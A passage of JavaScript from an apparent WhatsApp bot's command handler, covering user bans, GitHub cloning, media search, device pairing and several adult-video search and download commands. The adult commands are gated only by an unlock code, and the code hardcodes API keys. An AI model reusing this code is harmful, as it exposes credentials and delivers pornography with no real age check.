        
        reply(`🚫 *User @${orang.split('@')[0]} banned*`, [orang]);
    } else {
        return reply("👤 *Tag or reply to user*");
    }
}
break;

case "unbanuser1": 
case "unbanuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] ? m.mentionedJid[0] : 
                    text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : 
                    m.quoted ? m.quoted.sender : '';
        
        if (!global.banned[orang]) return reply(`⚠️ *User not in ban list*`);
        
        delete global.banned[orang];
        
        // Save to file
        try {
            fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
        } catch (e) {
            console.log("Error saving banned.json:", e);
        }
        
        reply(`✅ *User @${orang.split('@')[0]} unbanned*`, [orang]);
    } else {
        return reply("👤 *Tag or reply to user*");
    }
}
break;

case "listban": 
case "listbanuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    // Get all users where banned is true
    const bannedUsers = Object.keys(global.banned).filter(jid => global.banned[jid] === true);
    
    if (bannedUsers.length < 1) return reply("📭 *No banned users*");
    
    let teksnya = `🚫 *Banned Users*\n\n`;
    bannedUsers.forEach(jid => teksnya += `• @${jid.split("@")[0]}\n`);
    
    await devtrust.sendMessage(m.chat, {
        text: teksnya,
        mentions: bannedUsers
    }, { quoted: m });
}
break;

case 'git': 
case 'gitclone': {
    if (!args[0]) return reply(`🔗 *Usage:* ${prefix}${command} https://github.com/...`);
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`❌ *Invalid GitHub link*`);
    
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
    let [, user, repo] = args[0].match(regex1) || [];
    repo = repo.replace(/.git$/, '');
    
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1];
    
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            document: { url: url },
            fileName: filename + '.zip',
            mimetype: 'application/zip'
        }),
        { quoted: m }
    );
} 
break;

case 'coffee': 
case 'kopi': {
    devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://coffee.alexflipnote.dev/random' },
            caption: "☕ *Fresh Coffee*"
        }),
        { quoted: m }
    );
} 
break;

case 'gxhxhxh': 
case 'styletext': {
    if (!text) return reply(`✏️ *Example:* styletext Hello`);
    
    let anu = await styletext(text);
    let teks = `🎨 *Style Text*\n\n"${text}"\n\n`;
    
    for (let i = 0; i < anu.length; i++) {
        teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`;
    }
    
    await reply(teks);
} 
break;
  case 'xvideos': {
    // 18+ unlock check
    const _xvid_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xvid_unlocked = (() => { try { const u = fs.existsSync('./database/adult_unlocked.json') ? JSON.parse(fs.readFileSync('./database/adult_unlocked.json','utf-8')) : []; return u.some(id => String(id).replace(/[^0-9]/g,'') === _xvid_num); } catch(e) { return false; } })();
    const _xvid_banned = (() => { try { const b = fs.existsSync('./database/adult_banned.json') ? JSON.parse(fs.readFileSync('./database/adult_banned.json','utf-8')) : []; return b.some(id => String(id).replace(/[^0-9]/g,'') === _xvid_num); } catch(e) { return false; } })();
    if (_xvid_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xvid_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    if (!text) return reply(`🔞 *XVideos Search & Download*\n\nUsage: ${prefix}xvideos [search query]\nExample: ${prefix}xvideos step mom`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    try {
        const searchRes = await axios.get(`https://api.princetechn.com/api/search/xvideossearch?apikey=prince&query=${encodeURIComponent(text)}`, { timeout: 20000 });
        const searchData = searchRes.data;

        if (!searchData.success || !searchData.results?.length) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *"${text}"* se koi result nahi mila. Koi aur search karo.`);
        }

        const results = searchData.results.slice(0, 8);
        const menuText = results.map((v, i) =>
            `*${i + 1}.* ${v.title.substring(0, 60)}\n    ⏱️ ${v.duration || 'N/A'}`
        ).join('\n\n');

        const sentMsg = await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: results[0].thumb },
                caption: `🔞 *XVideos Search Results*\n🔎 Query: *${text}*\n\n${menuText}\n\n📌 *Number reply karo download ke liye*`
            }),
            { quoted: m }
        );

        const _xvHandler = async (msgUpdate) => {
            try {
                const msg = msgUpdate?.messages[0];
                if (!msg?.message) return;
                const replyTxt = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim();
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId;
                if (stanzaId !== sentMsg?.key?.id) return;

                const num = parseInt(replyTxt);
                if (isNaN(num) || num < 1 || num > results.length) return;

                devtrust.ev.off('messages.upsert', _xvHandler);
                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msg.key } });

                const chosen = results[num - 1];
                await devtrust.sendMessage(m.chat, { text: `⬇️ Downloading: *${chosen.title.substring(0, 50)}*\nPlease wait...` }, { quoted: msg });

                // Get download link
                const dlRes = await axios.get(`https://api.princetechn.com/api/download/xvideosdl?apikey=prince&url=${encodeURIComponent(chosen.url)}`, { timeout: 30000 });
                const dlData = dlRes.data;

                if (!dlData.success || !dlData.result?.download_url) {
                    throw new Error('Download link nahi mila');
                }

                const r = dlData.result;
                const videoCaption = `🎬 *${r.title || chosen.title}*\n👁️ ${r.views || 'N/A'} | 👍 ${r.likes || 'N/A'} | 👎 ${r.dislikes || 'N/A'}\n📦 Size: ${r.size || 'N/A'}`;

                // Download buffer then send as actual file
                const videoBuf = Buffer.from((await axios.get(r.download_url, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                    timeout: 300000,
                    maxContentLength: 500 * 1024 * 1024
                })).data);

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({ video: videoBuf, caption: videoCaption, mimetype: 'video/mp4' }),
                    { quoted: msg }
                );
                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });

            } catch (e) {
                console.error('xvideos handler error:', e.message);
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                reply(`❌ *Download failed:* ${e.message}`);
            }
        };

        devtrust.ev.on('messages.upsert', _xvHandler);
        setTimeout(() => devtrust.ev.off('messages.upsert', _xvHandler), 120000);

    } catch (e) {
        console.error('xvideos search error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *XVideos Search failed:* ${e.message}`);
    }
}
break;

  case "xvideodl": {
  if (!isCreator) return reply("Owner only"); 
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
await devtrust.sendMessage(m.chat, {react: {text: '🍑', key: m.key}})
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await devtrust.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `*Title:* ${videoData.title || 'No title'}\n` +
`*Views:* ${videoData.views || 'No view information'}\n` +
`*Votes:* ${videoData.vote || 'No vote information'}\n` +
`*Likes:* ${videoData.like_count || 'No like information'}\n` +
`*Dislikes:* ${videoData.dislike_count || 'No dislike information'}`,
});
await devtrust.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break;
  case "xnxxvideodl": {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!text) return reply("📌 *Usage:* .xnxxvideodl <xnxx link>\nExample: .xnxxvideodl https://www.xnxx.com/video-xxx/...");
    if (!text.includes("xnxx.com")) return reply("❌ *Link must be from xnxx.com*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    try {
        const xdata = await xnxxDownload(text);
        const videoUrl = xdata.best;
        if (!videoUrl) throw new Error('No video URL found');

        const caption = `🍑 *XNXX Download*\n\n` +
            `📽️ *Title:* ${xdata.title.slice(0, 100)}\n` +
            `🎬 *Quality:* ${xdata.sources.high ? 'High (360p)' : 'Low (240p)'}`;

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ video: { url: videoUrl }, mimetype: 'video/mp4', caption }),
            { quoted: m }
        );
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('xnxxvideodl error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;
case 'xvideosearch':{
    // 18+ unlock check
    const _xvsrch_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xvsrch_unlocked = (() => { try { const u = fs.existsSync('./database/adult_unlocked.json') ? JSON.parse(fs.readFileSync('./database/adult_unlocked.json','utf-8')) : []; return u.some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num); } catch(e) { return false; } })();
    const _xvsrch_banned = (() => { try { const b = fs.existsSync('./database/adult_banned.json') ? JSON.parse(fs.readFileSync('./database/adult_banned.json','utf-8')) : []; return b.some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num); } catch(e) { return false; } })();
    if (_xvsrch_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xvsrch_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://apis.prexzyvilla.site/nsfw/xvideos-search?query=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `🍑\nxvideo search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await devtrust.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await devtrust.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break; 
// ✅ Command switch
case 'xnxxsearch': {
    // 18+ unlock check
    const _xnxxs_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xnxxs_unlocked = (() => { try { const u = fs.existsSync('./database/adult_unlocked.json') ? JSON.parse(fs.readFileSync('./database/adult_unlocked.json','utf-8')) : []; return u.some(id => String(id).replace(/[^0-9]/g,'') === _xnxxs_num); } catch(e) { return false; } })();
    const _xnxxs_banned = (() => { try { const b = fs.existsSync('./database/adult_banned.json') ? JSON.parse(fs.readFileSync('./database/adult_banned.json','utf-8')) : []; return b.some(id => String(id).replace(/[^0-9]/g,'') === _xnxxs_num); } catch(e) { return false; } })();
    if (_xnxxs_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xnxxs_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
        if (!text) return reply(`Enter Query`)
        reply(mess.wait)
        const fg = require('api-dylux')
        let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break;  
case 'xnxx': {
    // Adult unlock check
    const _xnxxSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    const _xnxxUnlocked = (() => { try { const u = fs.existsSync('./database/adult_unlocked.json') ? JSON.parse(fs.readFileSync('./database/adult_unlocked.json','utf-8')) : []; return u.some(id => String(id).replace(/[^0-9]/g,'') === _xnxxSenderNum); } catch(e) { return false; } })();
    const _xnxxBanned = (() => { try { const b = fs.existsSync('./database/adult_banned.json') ? JSON.parse(fs.readFileSync('./database/adult_banned.json','utf-8')) : []; return b.some(id => String(id).replace(/[^0-9]/g,'') === _xnxxSenderNum); } catch(e) { return false; } })();
    if (_xnxxBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xnxxUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    if (!text) {
        return reply('❌ Please enter a name.\n📌 Example: *.xnxx mia*');
    }
    if (!global.videoCache) global.videoCache = new Map();
    try {
        await devtrust.sendMessage(m.chat, { text: `🔍 *Searching for:* ${text}\n⏳ Please wait...` }, { quoted: m });
        const searchResults = await xnxxSearch(text);
        if (!searchResults || searchResults.length === 0) {
            return reply(`❌ No videos found for *${text}*`);
        }
        const topResults = searchResults.slice(0, 10);
        let listMessage = `╭━━━━━━━━━━━━━━━╮\n`;
        listMessage += `┃ 📽️ *VIDEO SEARCH RESULTS*\n`;
        listMessage += `┃ 🔎 Query: ${text}\n`;
        listMessage += `╰━━━━━━━━━━━━━━━╯\n\n`;
        topResults.forEach((video, index) => {
            listMessage += `*${index + 1}.* ${video.title}\n`;
        });
        listMessage += `\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n`;
        listMessage += `💬 *Reply with the number of the desired video.*\n`;
        listMessage += `📌 For example: *1* or *2* (1-${topResults.length})`;
        const listMsg = await devtrust.sendMessage(m.chat, { text: listMessage }, { quoted: m });
        const sessionId = `${m.chat}_${listMsg.key.id}`;
        global.videoCache.set(sessionId, { videos: topResults, listMsgId: listMsg.key.id });
        const _xnxxHandler = async (messageUpdate) => {
            try {
                const messageData = messageUpdate?.messages?.[0];
                if (!messageData?.message) return;
                const fromChat = messageData.key.remoteJid;
                if (fromChat !== m.chat) return;
                const ctx = messageData.message.extendedTextMessage?.contextInfo;
                const stanzaId = ctx?.stanzaId;
                if (stanzaId !== listMsg.key.id) return;
                const replyText = (messageData.message.extendedTextMessage?.text || messageData.message.conversation || '').trim();
                const number = parseInt(replyText);
                const cached = global.videoCache.get(sessionId);
                if (!cached) {
                    devtrust.ev.off('messages.upsert', _xnxxHandler);
                    return;
                }
                if (isNaN(number) || number < 1 || number > cached.videos.length) {
                    await devtrust.sendMessage(fromChat, { react: { text: '⚠️', key: messageData.key } });
                    return;
                }
                const selectedVideo = cached.videos[number - 1];
                await devtrust.sendMessage(fromChat, { react: { text: '⏳', key: messageData.key } });
                try {
                    await devtrust.sendMessage(fromChat, { text: '⏳ *Fetching video...*\nPlease wait...' }, { quoted: messageData });
                    const videoData = await xnxxDownload(selectedVideo.url);
                    const videoUrl = videoData.best || videoData.sources?.high || videoData.sources?.low || videoData.sources?.hls;
                    if (!videoUrl) throw new Error('No download URL found');
                    await devtrust.sendMessage(fromChat, {
                        video: { url: videoUrl },
                        caption: `🎬 *${videoData.title || selectedVideo.title}*\n\n📥 Downloaded successfully`,
                        gifPlayback: false
                    }, { quoted: messageData });
                    await devtrust.sendMessage(fromChat, { react: { text: '✅', key: messageData.key } });
                    global.videoCache.delete(sessionId);
                    devtrust.ev.off('messages.upsert', _xnxxHandler);
                } catch (error) {
                    console.error('xnxx video send error:', error);
                    await devtrust.sendMessage(fromChat, { react: { text: '❌', key: messageData.key } });
                    await devtrust.sendMessage(fromChat, { text: '❌ Failed to send video. Please try again..' }, { quoted: messageData });
                }
            } catch (e) {
                console.error('xnxx handler error:', e);
            }
        };
        devtrust.ev.on('messages.upsert', _xnxxHandler);
        setTimeout(() => {
            global.videoCache.delete(sessionId);
            devtrust.ev.off('messages.upsert', _xnxxHandler);
        }, 5 * 60 * 1000);
    } catch (error) {
        console.error('xnxx API Error:', error);
        reply('❌ API connection failed. Please try again later..');
    }
}
break;
case 'imbd': {
    if (!text) return reply(`🎬 *Enter a movie or series name*`);
    
    try {
        let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
        
        let imdbt = `🎬 *${fids.data.Title}* (${fids.data.Year})\n\n` +
            `⭐ Rating: ${fids.data.imdbRating}/10\n` +
            `⏳ Runtime: ${fids.data.Runtime}\n` +
            `🎭 Genre: ${fids.data.Genre}\n` +
            `📅 Released: ${fids.data.Released}\n` +
            `👤 Director: ${fids.data.Director}\n` +
            `👥 Cast: ${fids.data.Actors}\n\n` +
            `📝 ${fids.data.Plot.substring(0, 300)}...`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: fids.data.Poster },
                caption: imdbt
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("❌ *Movie not found*");
    }
    break;
}

case 'tiktoksearch': {
    if (!text) return reply("🎵 *Enter a search term*");

    try {
        let query = text;
        let url = `https://apis.prexzyvilla.site/search/tiktoksearch?q=${encodeURIComponent(query)}`;
        let response = await fetch(url);
        let json = await response.json();

        if (!json.status || !json.data || json.data.length === 0) {
            return reply("❌ *No results found*");
        }

        let videos = json.data.slice(0, 3);

        for (let i = 0; i < videos.length; i++) {
            let vid = videos[i];
            let date = new Date(vid.create_time * 1000);
            let info = `🎵 *TikTok #${i+1}*\n\n` +
                `👍 ${vid.digg_count} likes\n` +
                `👀 ${vid.play_count} views\n` +
                `📝 ${vid.title}\n` +
                `📅 ${date.toDateString()}`;

            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    video: { url: vid.play },
                    caption: info
                }),
                { quoted: m }
            );
        }
    } catch (err) {
        console.log(err);
        reply("❌ *Error fetching TikTok data*");
    }
}
break;


case 'imnxmxg':
case 'pinterest': {
    if (!q.includes("|")) return reply("📌 *Usage:* pinterest query | amount\nExample: pinterest Naruto | 5");

    let [query, amount] = q.split("|").map(t => t.trim());
    amount = parseInt(amount) || 1;

    if (amount > 20) return reply("⚠️ *Max 20 images*");

    try {
        let apiUrl = `https://api-rebix.vercel.app/api/pinterest?q=${encodeURIComponent(query)}`;
        let response = await fetch(apiUrl);

        if (!response.ok) return reply(`⚠️ *API Error ${response.status}*`);

        let data = await response.json();

        if (!data || !Array.isArray(data.result) || data.result.length === 0) {
            return reply(`❌ *No images found for "${query}"*`);
        }

        let images = data.result.filter(Boolean).sort(() => Math.random() - 0.5);
        let sentCount = 0;

        for (let imageUrl of images) {
            if (sentCount >= amount) break;

            try {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: imageUrl },
                        caption: `🖼️ *${query}*`
                    })
                );
                sentCount++;
                await sleep(2000);
            } catch (err) {
                continue;
            }
        }

        if (sentCount === 0) reply("⚠️ *No accessible images found*");
    } catch (err) {
        console.error(err);
        reply("⚠️ *Pinterest error* • Try again");
    }
}
break;

case 'nsbxmdmfw': {
    try {
        const apiUrl = 'https://draculazyx-xyzdrac.hf.space/api/hentai';
        const response = await fetch(apiUrl);

        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const data = await response.json();

        if (data && data.videoUrl) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    video: { url: data.videoUrl },
                    caption: `🎥 *${data.title || 'Video'}*\n⚠️ 18+ Content`
                }),
                { quoted: m }
            );
        } else {
            reply("❌ *Content unavailable*");
        }
    } catch (error) {
        console.error(error);
        reply("⚠️ *Error fetching content*");
    }
}
break;

case 'buy-panel': {
    await devtrust.sendMessage(m.chat, { react: { text: '🛒', key: m.key } });
    reply(`🛒 *Panel Purchase*\n\n` +
        `💎 1GB • 2GB • 3GB • 4GB\n` +
        `💎 5GB • 6GB • 7GB • 8GB\n` +
        `💎 9GB • 10GB • Unlimited\n\n` +
        `📩 *DM: +923417022212*`);
}
break;

case 'setaccount': {
    if (!isCreator) return reply('🔒 *Owner only*');

    const text = args.join(' ');
    if (!text.includes('|'))
        return reply('❌ *Format:* setaccount Name | Number | Bank | Note');

    const [name, number, bank, note] = text.split('|').map(v => v.trim());

    if (!name || !number || !bank)
        return reply('❌ *Name, number and bank required*');

    const accounts = loadAccounts();
    accounts[sender] = { name, number, bank, note: note || '' };
    saveAccounts(accounts);

    reply('✅ *Account details saved*');
}
break;

case 'aza':
case 'account': {
    if (!isCreator) return reply("🔒 *Owner only*");

    const accounts = loadAccounts();
    const acc = accounts[sender];

    if (!acc) return reply('❌ *No account details set*\nUse setaccount first');

    await devtrust.sendMessage(m.chat, { react: { text: '💳', key: m.key } });

    reply(`💳 *Account Details*\n\n` +
        `🏦 ${acc.bank}\n` +
        `👤 ${acc.name}\n` +
        `🔢 ${acc.number}\n\n` +
        `📝 ${acc.note || '—'}`);
}
break;

// ==================== PAIRING COMMANDS FOR WHATSAPP BOT ====================

case 'pair': {
    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    return reply(`🌐 *Pairing is only available on the website!*\n\nPlease visit the website to generate your pairing code.\n\n_WhatsApp sy code generate karna disabled hai._`);
    if (!q) return reply(`📌 *Usage:* pair 923xxxxxx`);

    let target = text.split("|")[0];
    let cleanNumber = target.replace(/[^0-9]/g, '');
    
    // Validate number
    if (!/^\d{7,15}$/.test(cleanNumber)) {
        return reply("❌ *Invalid phone number format*");
    }

    // Check if number exists on WhatsApp
    try {
        const contactInfo = await devtrust.onWhatsApp(cleanNumber + '@s.whatsapp.net');
        if (!contactInfo || contactInfo.length === 0) {
            return reply("❌ *Number not registered on WhatsApp*");
        }
    } catch (e) {
        console.log('WhatsApp check error:', e);
    }

    // Create pairing directory if it doesn't exist
    const WHATSAPP_PAIRING_DIR = './database/pairing/';
    if (!fs.existsSync(WHATSAPP_PAIRING_DIR)) {
        fs.mkdirSync(WHATSAPP_PAIRING_DIR, { recursive: true });
    }

    // Send processing message
    const processingMsg = await devtrust.sendMessage(m.chat, {
        text: `🔗 *Generating pairing code for +${cleanNumber}*\n⏳ Please wait...`
    }, { quoted: m });

    try {
        // Load the pair module (same as Telegram bot)
        const startPairing = require('./pair');
        const jid = cleanNumber + '@s.whatsapp.net';
        
        // Start pairing (this will generate code and save to file)
        await startPairing(jid);
        
        // Wait 4 seconds (same as Telegram bot)
        await sleep(4000);

        // Read the pairing file (same as Telegram bot)
        const pairingFile = path.join(__dirname, 'nexstore', 'pairing', 'pairing.json');
        
        if (!fs.existsSync(pairingFile)) {
            throw new Error('Pairing file not found');
        }
        
        const cu = fs.readFileSync(pairingFile, 'utf-8');
        const cuObj = JSON.parse(cu);
        const pairingCode = cuObj.code;

        if (!pairingCode) {
            throw new Error('No code found in pairing file');
        }

        // Format the code nicely
        let formattedCode = pairingCode;
        if (!pairingCode.includes('-') && pairingCode.length > 4) {
            formattedCode = pairingCode.match(/.{1,4}/g).join('-');
        }

        // Save pairing data to WhatsApp directory
        const pairingData = {
            jid: jid,
            number: cleanNumber,
            code: pairingCode,
            timestamp: Date.now(),
            date: new Date().toISOString(),
            status: 'pending',
            pairedBy: m.sender
        };
        
        fs.writeFileSync(
            path.join(WHATSAPP_PAIRING_DIR, `${cleanNumber}@s.whatsapp.net.json`), 
            JSON.stringify(pairingData, null, 2)
        );

        // Delete processing message
        await devtrust.sendMessage(m.chat, { delete: processingMsg.key });

        // Send code (FIRST MESSAGE)
        await devtrust.sendMessage(m.chat, { 
            text: `🔑 *YOUR PAIRING CODE*\n\n\`${formattedCode}\`` 
        }, { quoted: m });

        // Send instructions (SECOND MESSAGE)
        const instructions = `📱 *Pairing Steps*\n\n` +
            `1️⃣ Open WhatsApp on your phone\n` +
            `2️⃣ Tap *⋮* (Menu) → Linked Devices\n` +
            `3️⃣ Tap *Link a Device*\n` +
            `4️⃣ Enter this code: \`${formattedCode}\`\n\n` +
            `_⏱️ Code expires in 5 minutes_`;

        await devtrust.sendMessage(m.chat, { text: instructions }, { quoted: m });

        // Send code again (THIRD MESSAGE)
        await devtrust.sendMessage(m.chat, { 
            text: `${formattedCode}`
        }, { quoted: m });

    } catch (error) {
        console.error('Pairing error:', error);
        
        // Delete processing message
        await devtrust.sendMessage(m.chat, { delete: processingMsg.key });
        
        // Send error message
        await reply(`❌ *Pairing Failed*\n\n${error.message || 'Could not generate code. Try again later.'}`);
    }
}
break;

case 'listpair': {
    // 🔓 Keep owner-only for security (lists ALL paired devices)
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        const WHATSAPP_PAIRING_DIR = './database/pairing/';
        let allPairs = [];
        
        // Read from WhatsApp pairing directory
        if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
            const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
            files.forEach(file => {
                if (file.endsWith('.json')) {
                    try {
                        const filePath = path.join(WHATSAPP_PAIRING_DIR, file);
                        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
                        allPairs.push({
                            number: data.number || file.replace('.json', '').split('@')[0],
                            date: data.date || new Date(fs.statSync(filePath).birthtime).toISOString(),
                            status: data.status || 'unknown',
                            pairedBy: data.pairedBy || 'unknown'
                        });
                    } catch (e) {
                        const number = file.replace('.json', '').split('@')[0];
                        allPairs.push({
                            number: number,
                            date: new Date(fs.statSync(path.join(WHATSAPP_PAIRING_DIR, file)).birthtime).toISOString(),
                            status: 'unknown',
                            pairedBy: 'unknown'
                        });
                    }
                }
            });
        }
        
        if (allPairs.length === 0) {
            return reply(`📭 *No paired devices found*`);
        }
        
        // Sort by date (newest first)
        allPairs.sort((a, b) => new Date(b.date) - new Date(a.date));
        
        let pairedList = `📱 *Paired Devices*\n\n`;
        pairedList += `Total: ${allPairs.length}\n\n`;
        
        allPairs.forEach((pair, index) => {
            const dateStr = new Date(pair.date).toLocaleString();
            const statusEmoji = pair.status === 'pending' ? '⏳' : '✅';
            pairedList += `${index+1}. ${statusEmoji} *${pair.number}*\n`;
            pairedList += `   📅 ${dateStr}\n`;
            if (pair.pairedBy && pair.pairedBy !== 'unknown') {
                const shortUser = pair.pairedBy.split('@')[0];
                pairedList += `   👤 Paired by: @${shortUser}\n`;
            }
            pairedList += `\n`;
        });
        
        pairedList += `_Use .delpair [number] to remove_`;
        
        reply(pairedList);
        
    } catch (err) {
        console.error('Listpair error:', err);
        reply(`❌ *Error:* ${err.message}`);
    }
}
break;

case 'delpair': {
    // 🔓 REMOVED owner-only check - Users can delete their own pairings
    // But we need to check if they're deleting their own or need owner for others
    
    if (!q) return reply(`📌 *Usage:* delpair 923xxxxxx`);
    
    const cleanNumber = q.replace(/[^0-9]/g, '');
    const WHATSAPP_PAIRING_DIR = './database/pairing/';
    let deleted = false;
    let message = '';
    let isOwnerDeleting = isCreator || isSudo; // Check if owner/sudo
    
    // Check if this number belongs to the user or if they're owner
    const userNumber = m.sender.split('@')[0];
    const isOwnNumber = (userNumber === cleanNumber);
    
    if (!isOwnNumber && !isOwnerDeleting) {
        return reply(`🔒 *You can only delete your own pairings*\nUse your own number: ${userNumber}`);
    }
    
    // Delete from WhatsApp pairing directory
    if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
        try {
            const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
            const matchingFile = files.find(file => 
                file.includes(cleanNumber)
            );
            
            if (matchingFile) {
                const filePath = path.join(WHATSAPP_PAIRING_DIR, matchingFile);
                
                // If not owner, check if this file belongs to them
                if (!isOwnerDeleting) {
                    try {
                        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
                        const pairedBy = data.pairedBy || '';
                        if (!pairedBy.includes(userNumber) && !pairedBy.includes(m.sender)) {
                            return reply(`🔒 *This pairing doesn't belong to you*\nOnly the person who paired it or an owner can delete it.`);
                        }
                    } catch (e) {
                        // If can't read, only owners can delete
                        if (!isOwnerDeleting) {
                            return reply(`🔒 *Cannot verify ownership*\nAsk an owner to delete this.`);
                        }
                    }
                }
                
                fs.unlinkSync(filePath);
                deleted = true;
                message += `✅ Removed from WhatsApp storage\n`;
            }
        } catch (err) {
            console.error('Error deleting from WhatsApp dir:', err);
        }
    }
    
    // Delete from owner.json if exists (only owners should modify this)
    if (isOwnerDeleting) {
        const ownerPath = path.join(__dirname, 'allfunc', 'owner.json');
        if (fs.existsSync(ownerPath)) {
            try {
                let ownerData = JSON.parse(fs.readFileSync(ownerPath, 'utf-8'));
                const originalLength = ownerData.length;
                ownerData = ownerData.filter(id => 
                    !id.includes(cleanNumber)
                );
                if (ownerData.length !== originalLength) {
                    fs.writeFileSync(ownerPath, JSON.stringify(ownerData, null, 2));
                    message += `✅ Removed from owner.json\n`;
                    deleted = true;
                }
            } catch (err) {
                console.error('Error updating owner.json:', err);
            }
        }
    }
    
    // Delete session if exists (anyone can delete their own session)
    const SESSION_DIR = './CYBER_storage/sessions/';
    if (fs.existsSync(SESSION_DIR)) {
        try {
            const sessionPath = path.join(SESSION_DIR, `${cleanNumber}@s.whatsapp.net`);
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                message += `✅ Removed session\n`;
                deleted = true;
            }
        } catch (err) {
            console.error('Error deleting session:', err);
        }
    }
    
    if (deleted) {
        reply(`✅ *Pairing deleted for ${cleanNumber}*\n\n${message}`);
    } else {
        reply(`❌ *No pairing found for ${cleanNumber}*`);
    }
}
break;

case "gpt5": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();

    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
